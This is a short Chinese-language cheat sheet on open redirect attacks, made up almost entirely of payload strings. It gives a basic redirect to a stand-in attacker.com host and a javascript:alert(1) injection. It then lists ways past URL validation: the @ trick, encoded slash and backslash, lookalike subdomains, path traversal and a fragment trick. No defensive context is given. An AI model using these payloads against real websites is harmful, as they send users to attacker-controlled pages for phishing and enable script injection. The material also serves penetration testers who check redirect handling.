# 开放重定向

## 1. 基础重定向

```
/redirect?url=http://attacker.com
/login?next=javascript:alert(1)
```

## 2. 绕过技术

### @绕过

```
http://target.com@attacker.com
```

### 编码绕过

```
http://target.com%2f@attacker.com
http://target.com%5c@attacker.com
```

### 混淆绕过

```
http://target.com.attacker.com
http://attacker.com.target.com
```

### 路径遍历

```
/redirect?url=../internal
```

### 特殊字符

```
http://target.com/redirect?url=http://attacker.com#target.com
```
